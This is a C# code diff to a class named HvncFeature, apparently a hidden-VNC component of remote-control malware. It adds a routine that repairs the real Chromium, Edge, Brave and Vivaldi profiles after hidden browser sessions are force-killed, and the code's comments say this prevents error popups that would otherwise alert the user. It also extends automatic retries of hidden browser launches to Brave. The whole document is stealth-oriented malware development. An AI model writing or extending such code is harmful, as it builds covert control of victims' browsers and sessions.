@@ -448,10 +448,10 @@ internal static class HvncFeature
 
         // Repair real Opera profile: fix wrong path bug + repair corrupted JSON files.
         if (launchedOpera || launchedOperaGX) RepairOperaProfileAfterHvnc();
-        if (launchedEdge)     CleanRealBrowserLock("Microsoft",    "Edge",            "User Data");
-        if (launchedChrome)   CleanRealBrowserLock("Google",       "Chrome",          "User Data");
-        if (launchedBrave)    CleanRealBrowserLock("BraveSoftware","Brave-Browser",   "User Data");
-        if (launchedVivaldi)  CleanRealBrowserLock("Vivaldi",                         "User Data");
+        if (launchedEdge)     { CleanRealBrowserLock("Microsoft",    "Edge",            "User Data"); RepairChromiumRealProfile("Microsoft",    "Edge",            "User Data"); }
+        if (launchedChrome)   { CleanRealBrowserLock("Google",       "Chrome",          "User Data"); RepairChromiumRealProfile("Google",       "Chrome",          "User Data"); }
+        if (launchedBrave)    { CleanRealBrowserLock("BraveSoftware","Brave-Browser",   "User Data"); RepairChromiumRealProfile("BraveSoftware","Brave-Browser",   "User Data"); }
+        if (launchedVivaldi)  { CleanRealBrowserLock("Vivaldi",                         "User Data"); RepairChromiumRealProfile("Vivaldi",                         "User Data"); }
         if (launchedChromium) CleanRealBrowserLock("Chromium",                        "User Data");
         if (launchedFirefox)  CleanFirefoxRealLocks();
     }
@@ -1616,6 +1616,28 @@ internal static class HvncFeature
         }
     }
 
+    // Repairs corrupted Chromium JSON files in the real profile (Preferences, Local State).
+    // Called after HVNC force-kills a browser — prevents "profile error" popups on next real launch.
+    private static void RepairChromiumRealProfile(params string[] profilePathParts)
+    {
+        string appData  = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
+        string localApp = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
+        foreach (var root in new[] { appData, localApp })
+        {
+            string dir = root;
+            foreach (var part in profilePathParts)
+                dir = Path.Combine(dir, part);
+            if (!Directory.Exists(dir)) continue;
+            RepairChromiumJsonFile(Path.Combine(dir, "Local State"));
+            foreach (var sub in new[] { "Default", "Profile 1", "Profile 2", "Guest Profile" })
+            {
+                string subDir = Path.Combine(dir, sub);
+                if (!Directory.Exists(subDir)) continue;
+                RepairChromiumJsonFile(Path.Combine(subDir, "Preferences"));
+            }
+        }
+    }
+
     // Repairs the real Opera profile after HVNC use.
     // Previous code had a bug: ("Opera Software","Opera Stable","Opera GX Stable") joined all
     // three into ONE wrong path — nothing was ever cleaned. Now we handle each variant separately
@@ -2323,9 +2345,9 @@ internal static class HvncFeature
             if (pi.dwProcessId != 0) _launchedPids[pidKey] = pi.dwProcessId;
             if (pi.dwProcessId != 0 && exeBase == "opera.exe")    PatchCursorInfoAsync(pi.dwProcessId);
             if (pi.dwProcessId != 0 && exeBase == "explorer.exe") SuppressMscoriesAsync(pi.dwProcessId);
-            // If Edge or Explorer exits within 3 s (failed startup), retry once automatically.
+            // If Edge, Brave, or Explorer exits within 3 s (failed startup), retry once automatically.
             // isRetry guard prevents chaining: the retry itself never schedules another retry.
-            if (!isRetry && pi.dwProcessId != 0 && exeBase is "msedge.exe" or "explorer.exe")
+            if (!isRetry && pi.dwProcessId != 0 && exeBase is "msedge.exe" or "brave.exe" or "explorer.exe")
             {
                 var retryPid = pi.dwProcessId; var retryBase = exeBase; var retryPath = path; var retryClone = cloneBrowser;
                 Task.Run(async () =>
